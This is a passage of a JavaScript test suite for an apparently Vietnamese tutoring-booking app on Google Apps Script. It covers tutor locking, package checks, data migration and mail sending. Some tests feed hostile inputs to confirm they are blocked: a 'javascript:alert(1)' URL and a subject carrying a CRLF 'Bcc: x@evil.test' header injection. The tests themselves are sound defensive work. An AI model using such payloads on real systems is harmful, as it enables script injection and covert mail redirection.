  assert.deepStrictEqual(plan.bookings.map(b => b.id + ':' + (b.candidates > 0)), [b1.bookingId + ':true', b2.bookingId + ':false'], JSON.stringify(plan.bookings));
  assert.ok(plan.slots > 0);
  const r = api.lockTutor_('T001', 'admin@thaiput.vn');
  assert.ok(r.ok, JSON.stringify(r));
  assert.deepStrictEqual([r.reassigned.length, r.cancelled.length], [1, 1]);
  assert.strictEqual(c.row('BOOKINGS', b1.bookingId).tutor_id, 'T002');
  assert.strictEqual(c.row('BOOKINGS', b2.bookingId).status, 'CANCELLED_TUTOR', 'không ai thay: huỷ kiểu lỗi tutor (học viên được bù)');
  assert.ok(api.bookingCompensable_(c.row('BOOKINGS', b2.bookingId)), 'buổi huỷ được bù theo luật 5M');
  assert.strictEqual(api.userById_('T001').status, 'DISABLED');
  assert.ok(!c.rows('AVAILABILITY').some(a => a.tutor_id === 'T001' && a.date >= new Date(2026, 9, 12) && (a.status === 'OPEN' || a.status === 'CANCEL_PENDING')), 'giờ rảnh tương lai đã huỷ');
  assert.strictEqual(api.apiTutorHome(tok).reason, 'SESSION_INVALID', 'phiên cũ hết hiệu lực');
  assert.ok(c.rows('AUTH').filter(a => a.user_id === 'T001').every(a => !(new Date(a.expires_at) > api.getNow_())), 'mọi phiên và link của tutor đã hết hạn');
  assert.ok(c.row('BOOKINGS', 'BK800001').tutor_id === 'T001' && c.row('BOOKINGS', 'BK800001').status === 'CONFIRMED', 'buổi đã qua giữ nguyên');
  assert.ok(c.rows('ACTIVITY_LOG').some(l => l.action === 'TUTOR_DISABLED' && l.entity_id === 'T001'));
  assert.ok(c.mailsTo(EMAIL.S005).some(m => /huỷ|cancel/i.test(m.subject)), 'học viên buổi bị huỷ nhận email');
  assert.strictEqual(api.lockTutor_('T001', 'x').already, true, 'khoá lần 2: báo đã khoá');
  assert.strictEqual(api.lockTutor_('S003', 'x').reason, 'NOT_FOUND', 'không khoá học viên bằng menu tutor');
  const u = api.unlockTutor_('T001', 'admin@thaiput.vn');
  assert.ok(u.ok && api.userById_('T001').status === 'ACTIVE' && c.rows('ACTIVITY_LOG').some(l => l.action === 'TUTOR_ENABLED'));
});

t('I129', '5L gói: menu 2 báo mã trùng kèm dòng có hiệu lực và dòng sai; đăng ký gói trùng mã bị chặn, trang ẩn gói đó; Thêm gói kiểm hợp lệ; menu 1 bỏ dòng LEGACY khi không ai dùng, giữ khi còn người dùng; menu 1 ghi META', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  api.withLock_(() => { const t = api.table_('PACKAGES'); t.insert({ code: 'PASS_1M', name: 'Dòng này lỗi', type: 'DAYS', days: 30, price_vnd: 1, active: true }); t.insert({ code: 'bad code', name: '', type: 'WEEKS', days: 0, price_vnd: -5, active: true }); });
  api.clearDbCache_();
  const pi = api.packageIssues_(api.table_('PACKAGES').all());
  assert.ok(pi.errors.some(x => /PASS_1M trùng ở các dòng 4, 6: đặt lịch dùng dòng 6, menu 1 dùng dòng 4/.test(x)), pi.errors.join(' | '));
  assert.ok(pi.errors.some(x => /bad code/.test(x) && /mã/.test(x)) && pi.errors.some(x => /WEEKS/.test(x)) && pi.errors.some(x => /price_vnd/.test(x)));
  const ts = api.testSystem();
  assert.ok(ts.errors.some(x => /PASS_1M trùng/.test(x)), 'menu 2 báo đỏ');
  const rv = api.submitRegistration_(c.form({ package_code: 'PASS_1M', email: 'dup@test.com' }));
  assert.ok(!rv.ok && rv.reasons.indexOf('PACKAGE_BROKEN') !== -1, JSON.stringify(rv));
  assert.ok(!api.apiPublicInfo().data.packages.some(p => p.code === 'PASS_1M'), 'trang ẩn gói trùng mã');
  // Thêm gói
  assert.ok(api.addPackage_({ code: 'pass_3m', name: 'Gói 3 tháng', name_en: '3 month pass', type: 'days', days: '90', sessions: '', price_vnd: '4500000' }, 'admin').ok);
  const p3 = api.table_('PACKAGES').byId('PASS_3M');
  assert.ok(p3 && p3.type === 'DAYS' && Number(p3.days) === 90 && Number(p3.price_vnd) === 4500000 && p3.active === true, JSON.stringify(p3));
  assert.ok(/đã có/.test(api.addPackage_({ code: 'PASS_3M', name: 'x', type: 'DAYS', days: 5 }, 'a').errors.join()));
  assert.ok(/số buổi/.test(api.addPackage_({ code: 'PACK_X', name: 'x', type: 'SESSIONS' }, 'a').errors.join()), 'gói theo buổi cần số buổi');
  env.state.uiScript = [{ text: 'PACK_8' }, { text: 'Gói 8 buổi' }, { text: '8 lessons' }, { text: 'SESSIONS' }, { text: '' }, { text: '8' }, { text: '1.200.000' }, { text: 'Có' }];
  assert.ok(api.menuAddPackage().ok);
  const p8 = api.table_('PACKAGES').byId('PACK_8');
  assert.ok(p8 && Number(p8.sessions) === 8 && Number(p8.price_vnd) === 1200000 && p8.type === 'SESSIONS');
  env.state.uiScript = [{ text: 'X1' }, { button: 'CANCEL' }];
  assert.strictEqual(api.menuAddPackage(), null, 'Huỷ giữa chừng: không thêm');
  // LEGACY ở file mới
  const f = freshEnv(); f.api.setupFirstRun();
  f.api.withLock_(() => f.api.table_('PACKAGES').insert({ code: 'LEGACY', name: 'Gói buổi (cũ)', type: 'SESSIONS', price_vnd: 0, active: false }));
  f.api.clearDbCache_();
  f.api.setupFirstRun();
  f.api.clearDbCache_();
  assert.ok(!f.api.table_('PACKAGES').all().some(p => p.code === 'LEGACY'), 'menu 1 bỏ dòng LEGACY');
  assert.ok(f.api.table_('ACTIVITY_LOG').all().some(l => l.action === 'PACKAGE_REMOVED'));
  f.api.withLock_(() => { f.api.table_('PACKAGES').insert({ code: 'LEGACY', name: 'Gói buổi (cũ)', type: 'SESSIONS', sessions: 5, price_vnd: 0, active: false }); f.api.table_('STUDENT_PACKAGES').insert({ sp_id: 'SP00001', student_id: 'S0001', package_code: 'LEGACY', status: 'ACTIVE', sessions_total: 5 }); });
  f.api.clearDbCache_();
  const r2 = f.api.setupFirstRun();
  assert.ok(r2.lines.some(l => /còn 1 gói học viên mang mã LEGACY/.test(l)) && f.api.table_('PACKAGES').byId('LEGACY'), 'còn người dùng: giữ');
  const meta = {}; f.api.table_('META').all().forEach(m => { meta[m.key] = m.value; });
  assert.ok(meta.APP_VERSION === f.api.APP.VERSION && meta.ID_FLOOR_STUDENT_PACKAGES === '1', JSON.stringify(meta));
  assert.strictEqual(meta.MIG_1610, 'DONE', 'META ghi bước chuyển dữ liệu đã chạy');
  f.env.state.uiScript = [];
  assert.ok(f.api.menuMigrationStatus().some(m => m.id === 'MIG_1610' && m.done));
});

t('I130', '5L chuyển hệ thống: hệ thống cũ chuẩn bị (đóng cổng, trang báo link mới, gỡ sự kiện, xoá trigger, META); hệ thống mới chạy thử không ghi; chép thật theo mã, ghép cột theo tên, chạy lại không nhân đôi, đếm lại khớp; mốc mã không cấp lại số cũ; khoá hạ tầng không chép; chưa chuẩn bị hoặc bản cũ mới hơn thì từ chối', () => {
  const old = mk('2026-10-12 10:00'), oa = old.api;
  old.onlyOpen(K(14, 10), '19:00', ['T001']);
  const [bk] = old.book('S003', [[K(14, 10), '19:00']]);
  oa.withLock_(() => oa.writeMetaInLock_());   // hệ thống cũ đã dán 8.1.3 và chạy menu 1
  oa.withLock_(() => oa.table_('MAIL_LOG').insert({ time: new Date(2026, 9, 1), to: 's003@student.test', subject: 'Tết', kind: 'MKT:TET' }));
  cfgSet(old, 'SCHOOL_NAME', 'thaiput cũ');
  oa.createTriggers_();
  // Hệ thống mới (dán code, menu 1)
  oa.withLock_(() => { oa.table_('MAIL_LOG').insert({ time: new Date(2026, 9, 2), to: 'x@y.z', subject: 'link', kind: 'LOGIN_LINK' }); oa.table_('AVAILABILITY').insert({ avail_id: 'AV900099', tutor_id: 'T002', date: new Date(2026, 9, 1), slot: '19:00', status: 'OPEN', created_at: new Date(2026, 8, 30) }); });
  const nw = freshEnv(), na = nw.api;
  na.setupFirstRun(); na.setSimNow_('2026-10-12 10:00');
  // Hệ thống mới đã có một tài khoản cùng email học viên S005 nhưng khác mã: không chép đè, báo trùng
  na.withLock_(() => na.table_('USERS').insert({ user_id: 'S0099', role: 'STUDENT', email: 's005@student.test', name: 'Trùng', status: 'ACTIVE', created_at: new Date(2026, 9, 1) }));
  const copyOld = () => { nw.env.state.spreadsheets.OLD_DB = structuredClone(old.env.state.spreadsheets.DB_STAGING_TEST); nw.env.state.spreadsheets.OLD_DB.id = 'OLD_DB'; };
  copyOld();
  const notPrep = na.moveImport_('OLD_DB', {}, 'admin');
  assert.ok(!notPrep.ok && /chưa chạy "Chuẩn bị chuyển"/.test(notPrep.error), notPrep.error);
  // Bước 1 trên hệ thống cũ
  const pr = oa.prepareMoveOld_({ newUrl: 'https://vao.thaiput.vn' }, 'admin@thaiput.vn');
  assert.ok(pr.ok && pr.triggers === 8, JSON.stringify(pr));
  assert.strictEqual(old.env.state.triggers.filter(t => oa.TRIGGER_HANDLERS_.indexOf(t.fn) !== -1).length, 0, 'trigger cũ đã xoá');
  cfgSet(old, 'MOVED_TO_URL', 'javascript:alert(1)');
  assert.strictEqual(oa.maintInfo_().movedTo, '', 'link không phải https: không hiện');
  cfgSet(old, 'MOVED_TO_URL', 'https://vao.thaiput.vn');
  oa.clearConfigCache_();
  assert.deepStrictEqual([oa.maintMode_(), oa.maintInfo_().movedTo], ['CLOSED', 'https://vao.thaiput.vn']);
  assert.strictEqual(oa.apiStudentHome(tokenFor(old, 'S005')).reason, 'MAINT_CLOSED', 'cổng cũ đóng');
  assert.strictEqual(old.row('BOOKINGS', bk.bookingId).cal_state, 'DETACHED');
  assert.ok(oa.prepareMoveOld_({ newUrl: 'javascript:alert(1)' }, 'x').error, 'link mới phải https');
  copyOld();
  // Bước 2 chạy thử
  const usersBefore = na.table_('USERS').all().length;
  const dry = na.moveImport_('https://docs.google.com/spreadsheets/d/OLD_DB/edit#gid=0', { dryRun: true }, 'admin');
  assert.ok(dry.ok && dry.prepared, JSON.stringify(dry).slice(0, 300));
  const dUsers = dry.tabs.find(x => x.tab === 'USERS');
  assert.ok(dUsers.insert >= 12, JSON.stringify(dUsers));
  na.clearDbCache_();
  assert.strictEqual(na.table_('USERS').all().length, usersBefore, 'chạy thử không ghi');
  // Bước 3 chép thật: trùng email thì dừng trước khi ghi
  assert.ok(dUsers.conflicts.some(x => /S005/.test(x)), 'chạy thử báo trùng email');
  const blocked = na.moveImport_('OLD_DB', {}, 'admin@thaiput.vn');
  na.clearDbCache_();
  assert.ok(!blocked.ok && /trùng/.test(blocked.error) && /S005/.test(blocked.error) && na.table_('BOOKINGS').all().length === 0, 'chưa chép gì');
  na.withLock_(() => na.table_('USERS').update(na.table_('USERS').byId('S0099'), { email: 's005.cu@student.test' }));
  na.clearDbCache_();
  const r1 = na.moveImport_('OLD_DB', {}, 'admin@thaiput.vn');
  assert.ok(r1.ok && !r1.more && r1.mismatches.length === 0, JSON.stringify(r1).slice(0, 600));
  na.clearDbCache_(); na.clearConfigCache_();
  const nb = na.table_('BOOKINGS').byId(bk.bookingId);
  assert.ok(nb && nb.status === 'CONFIRMED' && nb.slot === '19:00' && nb.date instanceof Date, 'buổi chép đúng mã, đúng dạng');
  assert.strictEqual(na.userById_('S003').phone, old.api.userById_('S003').phone);
  const su = na.userById_('S003');
  assert.ok(/^=HYPERLINK\(.*zalo\.me/.test(String(nw.env.state.spreadsheets.NEW_DB.sheets.USERS.values[su._row - 1][na.SCHEMA.USERS.cols.indexOf('contact_link')])), 'công thức link Zalo dựng lại');
  assert.strictEqual(na.cfg_('SCHOOL_NAME'), 'thaiput cũ', 'CONFIG nghiệp vụ được chép');
  assert.notStrictEqual(na.cfg_('LESSON_CALENDAR_ID'), old.api.cfg_('LESSON_CALENDAR_ID'), 'khoá hạ tầng không chép');
  assert.notStrictEqual(na.maintMode_(), 'CLOSED', 'bảo trì của hệ thống cũ không chép');
  assert.ok(na.table_('MAIL_LOG').all().some(m => m.kind === 'MKT:TET'), 'sổ chống gửi trùng marketing được chép');
  assert.ok(!na.table_('MAIL_LOG').all().some(m => m.kind === 'LOGIN_LINK'), 'email hệ thống khác không chép');
  assert.ok(!na.table_('AVAILABILITY').byId('AV900099'), 'giờ rảnh đã qua không chép');
  assert.ok(na.userById_('S005'), 'hết trùng thì chép đủ');
  assert.ok(!na.table_('AUTH').all().some(a => a.kind === 'SESSION'), 'không chép phiên đăng nhập');
  assert.deepStrictEqual(na.table_('PACKAGES').byId('PACK_12') && na.table_('PACKAGES').byId('PACK_12').sessions, 12);
  // Chạy lại: không nhân đôi
  ['BOOKINGS', 'USERS'].forEach(tab => Object.keys(nw.env.state.props).filter(k => k.indexOf('IMPORT_DONE_OLD_DB_' + tab) === 0).forEach(k => delete nw.env.state.props[k]));
  const nBk = na.table_('BOOKINGS').all().length, nUs = na.table_('USERS').all().length;
  const r2 = na.moveImport_('OLD_DB', {}, 'admin');
  na.clearDbCache_();
  assert.ok(r2.ok && na.table_('BOOKINGS').all().length === nBk && na.table_('USERS').all().length === nUs, 'chạy lại không nhân đôi');
  // Mốc mã: không cấp lại số đã dùng ở hệ thống cũ (kể cả đã lưu trữ)
  const metaOld = {}; old.api.table_('META').all().forEach(m => { metaOld[m.key] = m.value; });
  assert.ok(Number(nw.env.state.props.ID_FLOOR_BOOKINGS) >= Number(metaOld.ID_FLOOR_BOOKINGS));
  // Bước 4: tạo lại sự kiện trên lịch mới
  const rc = na.recreateFutureEvents_('admin');
  assert.ok(rc.created >= 1, JSON.stringify(rc));
  assert.ok(na.table_('ACTIVITY_LOG').all().some(l => l.action === 'SYSTEM_IMPORTED'));
  // Bản cũ mới hơn: từ chối
  nw.env.state.spreadsheets.OLD_DB.sheets.META.values.forEach(v => { if (v[0] === 'APP_VERSION') v[1] = '9.0.0'; });
  assert.ok(/mới hơn/.test(na.moveImport_('OLD_DB', { dryRun: true }, 'a').error));
  assert.ok(/chính hệ thống này/.test(na.moveImport_('NEW_DB', { dryRun: true }, 'a').error));
});

t('I131', 'Soát 5L (hồi quy): menu khoá tutor hỏi lại 2 lần, tutor bị khoá không nhận thư; chuyển hệ thống dừng khi trùng mã khác dòng; ô CONFIG giờ bị đổi kiểu vẫn chép đúng; bước chuyển dữ liệu cũ chưa chạy thì chạy lại; mốc tuần đi theo; thông báo chưa đọc được chép; mã trùng trong file cũ chép một lần; gói có khoảng trắng thừa bị chặn; không ghi mốc mã USERS', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  c.onlyOpen(K(14, 10), '19:00', ['T001', 'T002']); c.onlyOpen(K(15, 10), '19:00', ['T001']);
  const [b1] = c.book('S003', [[K(14, 10), '19:00']]), [b2] = c.book('S005', [[K(15, 10), '19:00']]);
  api.withLock_(() => { const t = api.table_('BOOKINGS'); [b1, b2].forEach(b => t.update(t.byId(b.bookingId), { tutor_id: 'T001' })); });
  api.clearDbCache_();
  env.state.activeSpreadsheetId = 'DB_STAGING_TEST'; env.state.activeSheetName = 'USERS'; env.state.activeRow = api.userById_('T001')._row;
  env.state.uiScript = [{ button: 'YES' }, { button: 'NO' }];
  assert.strictEqual(api.menuLockTutor(), null, 'bấm Không ở lần hỏi thứ 2: không khoá');
  assert.strictEqual(api.userById_('T001').status, 'ACTIVE');
  const m0 = env.state.mails.length;
  env.state.uiScript = [{ button: 'YES' }, { button: 'YES' }];
  assert.ok(api.menuLockTutor().ok);
  const sent = env.state.mails.slice(m0);
  assert.ok(!sent.some(m => m.to === EMAIL.T001), 'tutor bị khoá không nhận thư đổi tutor, thư huỷ: ' + sent.map(m => m.to + ' ' + m.subject).join(' | '));
  assert.strictEqual(c.row('BOOKINGS', b2.bookingId).cancel_reason, 'Tutor nghỉ, không có tutor thay');
  env.state.uiScript = [];
  assert.ok(api.menuUnlockTutor().ok);
  // Gói: mã có khoảng trắng thừa
  api.withLock_(() => api.table_('PACKAGES').insert({ code: 'PASS_1M ', name: 'x', type: 'DAYS', days: 30, price_vnd: 10, active: true }));
  api.clearDbCache_();
  assert.ok(api.packageRowErrors_({ code: 'PASS_1M ', name: 'x', type: 'DAYS', days: 30, price_vnd: 10 }).some(x => /khoảng trắng/.test(x)));
  assert.ok(api.submitRegistration_(c.form({ package_code: 'PASS_1M ', email: 'sp@test.com' })).reasons.indexOf('PACKAGE_BROKEN') !== -1);
  assert.ok(!api.apiPublicInfo().data.packages.some(p => /PASS_1M/.test(p.code)), 'cả hai dòng đều ẩn tới khi sửa');
  // Chuyển hệ thống
  const old = mk('2026-10-12 10:00'), oa = old.api;
  oa.withLock_(() => {
    oa.writeMetaInLock_();
    const n = oa.table_('NOTIFICATIONS');
    n.insert({ notif_id: 'N0000901', time: new Date(2026, 9, 11), level: 'CRITICAL', event: 'RESULT_OVERDUE', channel: 'LOG', entity: 'BOOKING', entity_id: 'BK1', message: 'quá hạn', link: 'https://old#gid=1&range=A5', read: false });
    n.insert({ notif_id: 'N0000902', time: new Date(2026, 9, 11), level: 'CRITICAL', event: 'X', channel: 'LOG', message: 'đã đọc', read: true });
    oa.table_('PACKAGES').insert({ code: 'PASS_1M', name: 'Bản trùng trong file cũ', type: 'DAYS', days: 30, price_vnd: 5, active: true });
  });
  old.env.state.props['DONE_TREMIND0_2026-10-19'] = '[]';
  oa.prepareMoveOld_({}, 'admin');
  const slotRow = old.env.state.spreadsheets.DB_STAGING_TEST.sheets.CONFIG.values.find(v => v[0] === 'SLOT_START');
  if (slotRow) slotRow[1] = new Date(1899, 11, 30, 9, 0); else old.env.state.spreadsheets.DB_STAGING_TEST.sheets.CONFIG.values.push(['SLOT_START', new Date(1899, 11, 30, 9, 0), '']);
  old.env.state.spreadsheets.DB_STAGING_TEST.sheets.META.values = old.env.state.spreadsheets.DB_STAGING_TEST.sheets.META.values.filter(v => v[0] !== 'MIG_5M');
  const nw = freshEnv(), na = nw.api;
  na.setupFirstRun(); na.setSimNow_('2026-10-12 10:00');
  nw.env.state.spreadsheets.OLD_DB = structuredClone(old.env.state.spreadsheets.DB_STAGING_TEST); nw.env.state.spreadsheets.OLD_DB.id = 'OLD_DB';
  // Admin thêm tutor thử sau menu 1: lấy mã T001 (khác người với T001 cũ)
  assert.ok(na.addTutor_({ name: 'Tutor thử', email: 'thu@tutor.test' }, 'admin').ok);
  const dry = na.moveImport_('OLD_DB', { dryRun: true }, 'a');
  assert.ok(dry.tabs.find(x => x.tab === 'USERS').conflicts.some(x => /T001.*dòng khác/.test(x)), JSON.stringify(dry.tabs.find(x => x.tab === 'USERS')));
  assert.deepStrictEqual(dry.tabs.find(x => x.tab === 'PACKAGES').dupInOld, ['PASS_1M']);
  const bl = na.moveImport_('OLD_DB', {}, 'a');
  assert.ok(!bl.ok && /T001/.test(bl.error), 'trùng mã khác dòng: dừng');
  na.withLock_(() => { const t = na.table_('USERS'); t.update(t.byId('T001'), { user_id: 'T901' }); });
  na.clearDbCache_();
  assert.ok(nw.env.state.props.MIG_5M, 'hệ thống mới đã đánh dấu MIG_5M khi chạy menu 1 trên file trống');
  const r = na.moveImport_('OLD_DB', {}, 'a');
  assert.ok(r.ok && r.mismatches.length === 0, JSON.stringify(r).slice(0, 400));
  na.clearDbCache_(); na.clearConfigCache_();
  assert.strictEqual(na.cfg_('SLOT_START'), '09:00', 'ô giờ bị Sheets đổi kiểu vẫn chép đúng');
  assert.ok(na.slotList_().length > 0);
  assert.ok(!nw.env.state.props.MIG_5M && r.rerunSteps.some(x => /8\.1\.0/.test(x)), 'bước cũ chưa chạy: menu 1 tới sẽ chạy lại');
  assert.strictEqual(nw.env.state.props['DONE_TREMIND0_2026-10-19'], '[]', 'mốc nhắc tutor đi theo');
  const nn = na.table_('NOTIFICATIONS').all().filter(n => n.message === 'quá hạn');
  assert.ok(nn.length === 1 && nn[0].link === '' && nn[0].notif_id !== 'N0000901', 'thông báo chưa đọc chép với mã mới, bỏ link dòng cũ: ' + JSON.stringify(nn));
  assert.ok(!na.table_('NOTIFICATIONS').all().some(n => n.message === 'đã đọc'));
  assert.strictEqual(na.table_('PACKAGES').all().filter(p => p.code === 'PASS_1M').length, 1, 'mã trùng trong file cũ: chép một lần');
  assert.ok(!Object.keys(nw.env.state.props).some(k => /^IMPORT_DONE_/.test(k)), 'chép xong: xoá mốc chạy tiếp');
  const meta = {}; na.table_('META').all().forEach(m => { meta[m.key] = m.value; });
  assert.ok(!('ID_FLOOR_USERS' in meta) && !('ID_FLOOR_USERS_STUDENT' in meta), 'không ghi mốc mã USERS');
  const nt = na.addTutor_({ name: 'Mới', email: 'moi@tutor.test' }, 'admin');
  assert.ok(/^T\d{3}$/.test(nt.userId || na.userByEmail_('moi@tutor.test').user_id), 'mã tutor mới đúng dạng T + 3 số');
});

t('I132', '5Q gửi email cố định: mặc định GmailApp (chữ thuần + HTML, tên, trả lời về admin, không cần MailFix); MAIL_TRANSPORT = MAILAPP dùng MailApp; gõ sai về GMAILAPP; GmailApp thiếu quyền thì tự gửi lại bằng MailApp và báo admin; Google từ chối thì MAIL_FAILED, không ném lỗi; MAIL_LOG ghi đường gửi; hạn mức đọc lỗi không chặn thư nhắc', () => {
  const c = mk('2026-10-12 10:00'), api = c.api, st = c.env.state;
  assert.strictEqual(api.mailTransport_(), 'GMAILAPP');
  assert.ok(api.sendMail_('a@x.test', 'Chào bạn', '<p>Xin <b>chào</b> &amp; hẹn <a href="https://thaiput.vn/x">gặp</a></p><p>Dòng 2</p>', 'T1', 'high'));
  let m = st.mails[st.mails.length - 1];
  assert.strictEqual(m.transport, 'GMAILAPP');
  assert.strictEqual(m.body, 'Xin chào & hẹn gặp (https://thaiput.vn/x)\n\nDòng 2', JSON.stringify(m.body));
  assert.ok(/<b>chào<\/b>/.test(m.htmlBody) && m.name === api.cfg_('MAIL_FROM_NAME') && m.replyTo === api.cfgList_('ADMIN_EMAIL')[0]);
  const lg = () => api.table_('MAIL_LOG').all().filter(r => r.kind === 'T1');
  assert.strictEqual(lg()[0].transport, 'GMAILAPP', 'MAIL_LOG ghi đường gửi');
  // Tiêu đề có xuống dòng (chữ người ngoài gõ): bỏ xuống dòng
  api.sendMail_('a@x.test', 'A\r\nBcc: x@evil.test', '<p>x</p>', 'T1', 'high');
  assert.strictEqual(st.mails[st.mails.length - 1].subject, 'A Bcc: x@evil.test');
  // MAILAPP
  cfgSet(c, 'MAIL_TRANSPORT', 'mailapp');
  api.sendMail_('b@x.test', 'S', '<p>y</p>', 'T2', 'high');
  assert.strictEqual(st.mails[st.mails.length - 1].transport, 'MAILAPP');
  cfgSet(c, 'MAIL_TRANSPORT', 'GMAIL');
  assert.strictEqual(api.mailTransport_(), 'GMAILAPP', 'gõ sai: mặc định');
  // Thiếu quyền GmailApp: gửi lại bằng MailApp, báo admin một lần
  st.gmailNoPermission = true;
  const n0 = st.mails.length;
  assert.ok(api.sendMail_('c@x.test', 'S', '<p>z</p>', 'T3', 'high'));
  assert.ok(api.sendMail_('d@x.test', 'S', '<p>z</p>', 'T3', 'high'));
  const sent = st.mails.slice(n0).filter(x => /^[cd]@x\.test$/.test(x.to));
  assert.ok(sent.length === 2 && sent.every(x => x.transport === 'MAILAPP'), JSON.stringify(sent));
  api.clearDbCache_();
  assert.strictEqual(api.table_('ACTIVITY_LOG').all().filter(r => r.action === 'MAIL_FALLBACK').length, 1, 'báo một lần');
  assert.ok(api.table_('NOTIFICATIONS').all().some(n => /GmailApp thiếu quyền/.test(n.message)));
  assert.ok(api.table_('MAIL_LOG').all().filter(r => r.kind === 'T3').every(r => r.transport === 'MAILAPP'));
  // Lượt chạy mới (cờ trong bộ nhớ mất) trong cùng giờ: không báo lại (bộ đệm 1 giờ)
  const c3 = mk('2026-10-12 10:00'); c3.env.state.gmailNoPermission = true;
  c3.api.sendMail_('g@x.test', 'S', '<p>z</p>', 'T3', 'high'); c3.api.sendMail_('h@x.test', 'S', '<p>z</p>', 'T3', 'high');
  c3.api.clearDbCache_();
  assert.strictEqual(c3.api.table_('ACTIVITY_LOG').all().filter(r => r.action === 'MAIL_FALLBACK').length, 1);
  // Menu Kiểm tra gửi email báo đúng đường đã dùng (MailApp khi tự gửi lại)
  const mt = c3.api.mailTest_('k@x.test', 'admin@thaiput.vn');
  assert.ok(mt.ok && mt.transport === 'MAILAPP', JSON.stringify(mt));
  c3.env.state.gmailNoPermission = false;
  assert.strictEqual(c3.api.mailTest_('k@x.test', 'admin@thaiput.vn').transport, 'GMAILAPP');
  // Kênh MAIL_FAILED = EMAIL: không gửi email báo lỗi qua đường đang hỏng (chỉ ghi nhật ký MAIL_FALLBACK)
  const c4 = mk('2026-10-12 10:00');
  c4.api.withLock_(() => { const t = c4.api.table_('NOTIFY_RULES'), r = t.byId('MAIL_FAILED'); if (r) t.update(r, { channel: 'EMAIL' }); else t.insert({ event: 'MAIL_FAILED', level: 'WARNING', channel: 'EMAIL' }); });
  c4.api.clearDbCache_(); c4.env.state.gmailNoPermission = true;
  const m4 = c4.env.state.mails.length;
  c4.api.sendMail_('q@x.test', 'S', '<p>z</p>', 'T3', 'high');
  assert.strictEqual(c4.env.state.mails.length - m4, 1, 'chỉ 1 thư (thư gốc), không thêm thư báo lỗi');
  c4.api.clearDbCache_();
  assert.ok(!c4.api.table_('NOTIFICATIONS').all().some(n => /GmailApp thiếu quyền/.test(n.message)));
  assert.ok(c4.api.table_('ACTIVITY_LOG').all().some(r => r.action === 'MAIL_FALLBACK'));
  // Bảng và mã ký tự trong bản chữ thuần
  assert.strictEqual(api.mailPlainText_('<table><tr><td>Ngày</td><td>10/11</td></tr></table>A&#8211;B   \nC'), 'Ngày 10/11\n\nA\u2013B\nC');
  st.gmailNoPermission = false;
  // Lỗi khác quyền (hết hạn mức): không gửi lại, MAIL_FAILED, trả false
  const G = c.env.globals.GmailApp, M = c.env.globals.MailApp, og = G.sendEmail, om = M.sendEmail; let mailAppCalls = 0;
  G.sendEmail = () => { throw new Error('Service invoked too many times for one day: email.'); };
  M.sendEmail = (...a) => { mailAppCalls++; return om(...a); };
  try { assert.strictEqual(api.sendMail_('e@x.test', 'S', '<p>z</p>', 'T4', 'high'), false); } finally { G.sendEmail = og; M.sendEmail = om; }
  assert.strictEqual(mailAppCalls, 0, 'hết hạn mức: không gửi lại bằng MailApp');
  api.clearDbCache_();
  assert.ok(api.table_('ACTIVITY_LOG').all().some(r => r.action === 'MAIL_FAILED' && /e@x\.test/.test(r.detail)));
  // Đọc hạn mức lỗi: thư ưu tiên thấp vẫn gửi
  const oq = M.getRemainingDailyQuota; M.getRemainingDailyQuota = () => { throw new Error('no'); };
  try { assert.strictEqual(api.mailBudget_(), -1); assert.ok(api.sendMail_('f@x.test', 'S', '<p>z</p>', 'T5', 'low')); } finally { M.getRemainingDailyQuota = oq; }
  // Địa chỉ thử tải: không gửi, transport trống
  const n1 = st.mails.length; api.sendMail_('u1@loadtest.invalid', 'S', '<p>z</p>', 'T6', 'high');
  assert.strictEqual(st.mails.length, n1);
});

t('I133', '5Q chặn tái phạm: ngoài MailTransport.gs không file nào trong src/ gọi MailApp, GmailApp hay Gmail API trực tiếp (gửi thư hoặc đọc hạn mức); bản dist không còn cần tìm và thay', () => {
  const dir = path.join(__dirname, '..', 'src'), bad = [];
  fs.readdirSync(dir).filter(f => /\.gs$/.test(f) && f !== 'MailTransport.gs').forEach(f => {
    fs.readFileSync(path.join(dir, f), 'utf8').split('\n').forEach((line, i) => {
      // Bỏ chuỗi trong nháy trước (link https:// không làm mất phần sau), rồi bỏ chú thích; bắt cả tên đứng riêng (gán bí danh, M['sendEmail']).
      const code = line.replace(/'(?:[^'\\]|\\.)*'|"(?:[^"\\]|\\.)*"/g, "''").replace(/\/\/.*$/, '').replace(/^\s*\*.*$/, '').replace(/^\s*\/\*.*$/, '');
      if (/\b(MailApp|GmailApp)\b|\bGmail\.Users\b|getRemainingDailyQuota/.test(code)) bad.push(f + ':' + (i + 1) + ' ' + line.trim().slice(0, 80));
    });
  });
  assert.deepStrictEqual(bad, []);
  // Còn file MailFix.gs cũ trong dự án: menu 2 báo LỖI
  const c = mk('2026-10-12 10:00');
  globalThis.testMailFix = function () {};
  try { assert.ok(c.api.testSystem().errors.some(x => /MailFix/.test(x))); } finally { delete globalThis.testMailFix; }
  assert.ok(!c.api.testSystem().errors.some(x => /MailFix/.test(x)));
  const mt = fs.readFileSync(path.join(dir, 'MailTransport.gs'), 'utf8');
  assert.ok(/GmailApp\.sendEmail\(/.test(mt) && !/sendEmailFix_/.test(mt));
});

t('I134', 'Soát 5Q (nâng 8.0.10 lên thẳng 8.1.4): đủ cột mới mà bước chuyển 8.1.0 chưa chạy thì job mỗi giờ dùng luật cũ, không xoá hạn gói admin đã kéo dài tay; menu 1 chuyển hạn đó vào comp_days_admin', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  delete env.state.props.MIG_5M;   // menu 1 vừa thêm cột (đủ cột) nhưng chưa tới bước chuyển dữ liệu
  const raw = env.state.spreadsheets.DB_STAGING_TEST.sheets.STUDENT_PACKAGES.values, col = n => api.SCHEMA.STUDENT_PACKAGES.cols.indexOf(n);
  const sp = c.sp('SP00003'), ext = new Date(sp.end_date.getFullYear(), sp.end_date.getMonth(), sp.end_date.getDate() + 5);
  raw[sp._row - 1][col('end_date')] = ext;   // hạn admin đã kéo dài tay ở bản cũ
  api.clearDbCache_();
  assert.strictEqual(api.pkgCompReady_(), false, 'chưa chuyển dữ liệu: luật cũ');
  c.at('2026-10-12 11:05'); api.hourlyJob();
  assert.strictEqual(c.keyOf(c.sp('SP00003').end_date), c.keyOf(ext), 'job mỗi giờ không đổi hạn');
  api.setupCore_(env.globals.SpreadsheetApp.openById('DB_STAGING_TEST'));
  assert.ok(env.state.props.MIG_5M);
  api.clearDbCache_();
  assert.strictEqual(c.keyOf(c.sp('SP00003').end_date), c.keyOf(ext), 'menu 1 giữ hạn');
